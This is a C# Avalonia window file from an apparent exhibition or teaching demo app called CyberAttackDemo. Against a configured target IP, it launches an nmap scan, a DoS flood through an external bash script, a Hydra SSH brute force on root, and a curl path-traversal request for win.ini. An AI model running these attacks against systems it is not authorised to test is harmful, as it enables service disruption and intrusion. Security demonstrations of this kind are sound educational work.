using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Threading;
using Avalonia.Media; // ブラシ（色）を使用するために必要
using CyberAttackDemo;
using System;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public partial class MainWindow : Window
    {
        private readonly ConfigManager _config;
        private readonly AttackEngine _engine;
        
        // 30秒無操作リセット用のタイマー
        private readonly DispatcherTimer _inactivityTimer;
        // 攻撃実行中などを判定するフラグ
        private bool _isBusy = false;

        public MainWindow()
        {
            InitializeComponent();
            
            _config = new ConfigManager();
            _engine = new AttackEngine();

            // エンジンからのログを受け取って画面に表示
            _engine.OnLogReceived += msg => Dispatcher.UIThread.Post(() => WriteLog(msg));

            this.KeyDown += OnKeyDown;
            this.Opened += OnWindowOpened;

            // --- 自動リセットタイマーの設定 ---
            _inactivityTimer = new DispatcherTimer
            {
                Interval = TimeSpan.FromSeconds(30) // 30秒
            };
            _inactivityTimer.Tick += (s, e) => 
            {
                // タイマー発火時にリセット実行（念のため一回止める）
                _inactivityTimer.Stop();
                OnResetClick(this, new RoutedEventArgs());
            };

            // ユーザー操作を監視してタイマーをリセットするイベント
            this.PointerMoved += OnUserActivity;
            this.Tapped += OnUserActivity;
            // KeyDownは既存のハンドラ内で処理
        }

        // ユーザーの操作があったらタイマーをリセット（延長）する
        private void OnUserActivity(object? sender, EventArgs e)
        {
            // 攻撃中（ビジー）でなければタイマーを再始動
            if (!_isBusy)
            {
                _inactivityTimer.Stop();
                _inactivityTimer.Start();
            }
        }

        private async void OnWindowOpened(object? sender, EventArgs e)
        {
            _config.Load();
            await _engine.EnsureAttackScriptExistsAsync();

            // 初期化ログ
            WriteLog("SYSTEM INITIALIZED.", "system");
            WriteLog($"TARGET LOCKED: {_config.TargetIp}", "system");
            WriteLog($"ATTACK TIMEOUT SET TO: {_config.DdosDuration} SECONDS", "system");
            WriteLog("WAITING FOR USER AUTHORIZATION...", "system");
            
            if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;

            // 監視開始
            _inactivityTimer.Start();
        }

        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            // ユーザーアクティビティとして処理
            OnUserActivity(sender, e);

            if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q) Close();
            if (e.Key == Key.F11) ToggleFullScreen();
        }

        private void ToggleFullScreen()
        {
            if (WindowState == WindowState.FullScreen)
            {
                WindowState = WindowState.Normal;
                SystemDecorations = SystemDecorations.Full;
                Topmost = false;
            }
            else
            {
                WindowState = WindowState.FullScreen;
                SystemDecorations = SystemDecorations.None;
                Topmost = true;
            }
        }

        // --- フェーズ1: ポートスキャン ---
        private async void OnScanClick(object sender, RoutedEventArgs e)
        {
            SetBusyState(true, "SCANNING NETWORK...", Brushes.Yellow);
            
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING PORT SCAN ON {_config.TargetIp}...", "system");
            WriteLog("==========================================", "system");

            await _engine.RunCommandAsync("nmap", $"-F -sV {_config.TargetIp}");

            WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...", "system");
            
            // UI遷移
            if (Phase1Panel != null) Phase1Panel.IsVisible = false;
            if (Phase2Panel != null) Phase2Panel.IsVisible = true;
            if (ResetButton != null) ResetButton.IsVisible = true; // リセットボタンを表示
            
            // ★ここでリセットボタン等を有効化し、ビジー状態を解除する
            _isBusy = false;
            _inactivityTimer.Start(); // タイマー再開

            if (AttackSelector != null) AttackSelector.IsEnabled = true;
            if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
            if (ResetButton != null) ResetButton.IsEnabled = true; // リセットボタン有効化
            
            UpdateStatus("VULNERABILITY DETECTED. SELECT ACTION.", Brushes.Red);
        }

        // --- フェーズ2: 攻撃実行 ---
        private async void OnExecuteClick(object sender, RoutedEventArgs e)
        {
            if (AttackSelector == null) return;

            int selectedIndex = AttackSelector.SelectedIndex;

            if (selectedIndex == 0) await RunDosAttack();
            else if (selectedIndex == 1) await RunBruteForce();
            else if (selectedIndex == 2) await RunDirectoryTraversal();
        }

        // --- DoS攻撃 ---
        private async Task RunDosAttack()
        {
            SetBusyState(true, "EXECUTING DoS ATTACK...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING SHELL-SCRIPTED FLOOD ATTACK...", "system");
            WriteLog($"[*] DURATION LIMIT: {_config.DdosDuration} SECONDS", "system");
            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.", "system");
            WriteLog("==========================================", "system");

            await _engine.EnsureAttackScriptExistsAsync();

            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} dos";
            await _engine.RunCommandAsync("bash", args, _config.DdosDuration);

            WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.", "system");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- SSH攻撃 ---
        private async Task RunBruteForce()
        {
            SetBusyState(true, "CRACKING PASSWORDS...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog("[*] INITIATING SSH BRUTE FORCE ATTACK (Hydra)...", "system");
            WriteLog("[*] USER: root", "system");
            WriteLog("[*] WORDLIST: Built-in (Top 5 common passwords)", "system");
            WriteLog("==========================================", "system");

            await _engine.EnsureAttackScriptExistsAsync();

            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} hydra";
            await _engine.RunCommandAsync("bash", args, _config.DdosDuration + 30);

            WriteLog("\n[ATTACK FINISHED] HYDRA SESSION COMPLETE.", "system");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- ディレクトリトラバーサル ---
        private async Task RunDirectoryTraversal()
        {
            SetBusyState(true, "EXECUTING PATH TRAVERSAL...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING DIRECTORY TRAVERSAL ATTACK (ACTUAL)...", "system");
            WriteLog("[*] TARGET: Windows IIS (Assumed)", "system");
            WriteLog("[*] PAYLOAD: ../../../../windows/win.ini", "system");
            WriteLog("==========================================", "system");

            string targetUrl = $"http://{_config.TargetIp}/../../../../windows/win.ini";
            string args = $"--path-as-is -v --max-time 5 \"{targetUrl}\"";
            
            WriteLog($"[*] Executing: curl {args}", "system");
            
            await _engine.RunCommandAsync("curl", args, 10);

            WriteLog("\n[ATTACK FINISHED] Response received (or blocked by IDS).", "system");
            SetBusyState(false, "READY FOR NEXT COMMAND.");
        }

        // --- リセット ---
        private void OnResetClick(object sender, RoutedEventArgs e)
        {
            // UIスレッドで実行（タイマーから呼ばれた場合のため）
            Dispatcher.UIThread.Post(() => 
            {
                // ログコンテナの中身をクリア
                if (LogContainer != null) LogContainer.Children.Clear();
                
                if (Phase2Panel != null) Phase2Panel.IsVisible = false;
                if (Phase1Panel != null) Phase1Panel.IsVisible = true;
                if (ResetButton != null) ResetButton.IsVisible = false; 
                if (ScanButton != null) ScanButton.IsEnabled = true;
                
                _config.Load();
                if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;
                
                UpdateStatus("WAITING FOR COMMAND", Brushes.Yellow);
                WriteLog("SYSTEM RESET. READY.", "system");

                // リセット完了後、監視を再開
                _isBusy = false;
                _inactivityTimer.Start();
            });
        }

        // --- UI Helper Methods ---
        private void SetBusyState(bool isBusy, string statusText, IBrush? color = null)
        {
            _isBusy = isBusy;

            if (isBusy)
            {
                // 攻撃中は自動リセットタイマーを停止
                _inactivityTimer.Stop();

                if (ScanButton != null) ScanButton.IsEnabled = false;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = false;
                if (AttackSelector != null) AttackSelector.IsEnabled = false;
                if (ResetButton != null) ResetButton.IsEnabled = false;
            }
            else
            {
                // 攻撃終了後はタイマー再開
                _inactivityTimer.Start();

                if (ScanButton != null) ScanButton.IsEnabled = true;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
                if (AttackSelector != null) AttackSelector.IsEnabled = true;
                if (ResetButton != null) ResetButton.IsEnabled = true;
            }
            UpdateStatus(statusText, color);
        }

        private void UpdateStatus(string text, IBrush? color = null)
        {
            if (StatusText != null)
            {
                StatusText.Text = $"STATUS: {text}";
                if (color != null) StatusText.Foreground = color;
            }
        }

        // 色付きログ出力ロジック
        private void WriteLog(string message, string forceType = "")
        {
            if (LogContainer == null || LogScrollViewer == null) return;

            var textBlock = new TextBlock
            {
                Text = message,
                FontFamily = "Monospace",
                TextWrapping = TextWrapping.Wrap,
                FontSize = 16,
                Margin = new Thickness(0, 1, 0, 1)
            };

            if (forceType == "system")
            {
                textBlock.Foreground = Brushes.Lime;
            }
            else if (message.Contains("[STDERR]") || message.Contains("ERROR") || message.Contains("Failed"))
            {
                textBlock.Foreground = Brushes.Red;
            }
            else if (message.StartsWith("[*]") || message.StartsWith("[+]") || message.Contains("[発見]") || message.Contains("Process") || message.Contains("Vector"))
            {
                textBlock.Foreground = Brushes.Lime;
            }
            else if (message.StartsWith("<") || message.StartsWith(">") || message.Contains("HPING"))
            {
                textBlock.Foreground = Brushes.LightGray;
            }
            else
            {
                textBlock.Foreground = Brushes.WhiteSmoke;
            }

            LogContainer.Children.Add(textBlock);
            LogScrollViewer.ScrollToEnd();
        }
    }
}
